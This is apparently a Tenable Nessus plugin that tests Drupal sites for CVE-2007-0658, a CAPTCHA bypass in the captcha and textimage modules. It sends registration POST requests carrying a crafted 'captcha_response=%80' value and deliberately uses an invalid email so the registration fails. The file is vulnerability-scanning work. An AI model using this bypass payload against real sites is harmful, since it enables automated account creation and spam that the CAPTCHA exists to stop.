#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(24264);
  script_version("$Revision: 1.23 $");
  script_cvs_date("$Date: 2017/05/16 19:35:38 $");

  script_cve_id("CVE-2007-0658");
  script_bugtraq_id(22329);
  script_osvdb_id(32137, 32138);

  script_name(english:"Drupal Multiple Module $_SESSION Manipulation CAPTCHA Bypass");
  script_summary(english:"Attempts to bypass captcha when registering as a new user in Drupal.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by a
security bypass vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of Drupal installed on the remote host includes at least
one third-party module that adds a captcha to various forms (e.g. user
registration) that is affected by a security bypass vulnerability. A
remote attacker, using a specially crafted 'edit[captcha_response]'
parameter, can bypass modules designed to protect from automated
abuse.");
  script_set_attribute(attribute:"see_also", value:"https://www.drupal.org/node/114364");
  script_set_attribute(attribute:"see_also", value:"https://www.drupal.org/node/114519");
  script_set_attribute(attribute:"solution", value:
"Upgrade to Drupal captcha module version 4.7-1.2 / 5.x-1.1 and/or
textimage module version 4.7-1.2 / 5.x-1.1 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:U/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2007/01/30");
  script_set_attribute(attribute:"patch_publication_date", value:"2007/01/30");
  script_set_attribute(attribute:"plugin_publication_date", value:"2007/02/01");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:drupal:drupal");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:drupal:textimage");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2017 Tenable Network Security, Inc.");

  script_dependencies("drupal_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("installed_sw/Drupal", "www/PHP");
  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");

app = "Drupal";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];

# Make sure the affected script exists.
base_url = build_url(qs:dir, port:port);
vuln = FALSE;

url = dir + "/user/register";
r = http_send_recv3(port:port, method: "GET", item: url, exit_on_fail:TRUE);
# Clean URLS may not be enabled
if (r[0] =~ '404 Not Found')
{
  url = dir + "/?q=user/register";
  r = http_send_recv3(port:port, method: "GET", item: url, exit_on_fail:TRUE);
}

# If it does and uses a captcha...
if (
  'value="Create new account"' >< r[2] &&
  'captcha_response' >< r[2]
)
{
  # The $_SESSION needs to be blank, so clear all cookies
  clear_cookiejar();
  user = SCRIPT_NAME - ".nasl" + "-" + unixtime();
  # Drupal 4.x
  if (' name="edit[captcha_response]"' >< r[2])
  {
    # Try to bypass the captcha when registering.
    postdata =
      "edit[captcha_response]=%80&" +
      "edit[name]="+ user + "&" +
      # nb: this causes the registration to fail!
      "edit[mail]="+ user + "&" +
      "edit[form_id]=user_register&" +
      "op=Create+new+account";
    r = http_send_recv3(
      method   : "POST",
      port     : port,
      item     : url,
      data     : postdata,
      content_type: "application/x-www-form-urlencoded",
      exit_on_fail : TRUE
    );
  }
  # Drupal 5.x
  else
  {
    # Try to bypass the captcha when registering.
    postdata =
      "captcha_response=%80&" +
      "name="+ user + "&" +
      # nb: this causes the registration to fail!
      "mail="+ user + "&" +
      "form_id=user_register&" +
      "op=Create+new+account";
    r = http_send_recv3(
      method   : "POST",
      port     : port,
      item     : url,
      data     : postdata,
      content_type: "application/x-www-form-urlencoded",
      exit_on_fail : TRUE
    );

  }
  # There's a problem if it looks like the registration is ok
  # except for the email address.
  pat = "The e-mail address <em>" + user + "</em> is not valid.";
  if (
      pat >< r[2] &&
    (
      # nb: error if captcha type is 'captcha'.
      "The answer you entered to the math problem is incorrect." >!< r[2] &&
      # nb: error if captcha type is 'textimage'.
      "The image verification code you entered is incorrect" >!< r[2]
    )
  )
  {
    vuln = TRUE;
    output = strstr(r[2], pat);
  }
}
else exit(0, 'The '+app+' install at '+base_url+' does not use captchas.');

if (vuln)
{
  rep_extra = 'The above request attempts to register a user with an invalid'+
    '\nemail address and an empty captcha value which will result in only' +
    '\nan error regarding the invalid email if successful. A failed' +
    '\nbypass attempt would result in an error for the catpcha field.';
  security_report_v4(
    port       : port,
    severity   : SECURITY_WARNING,
    generic    : TRUE,
    line_limit : 5,
    rep_extra  : rep_extra,
    request    : make_list(http_last_sent_request()),
    output     : chomp(output)
  );
  exit(0);
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, app, base_url);
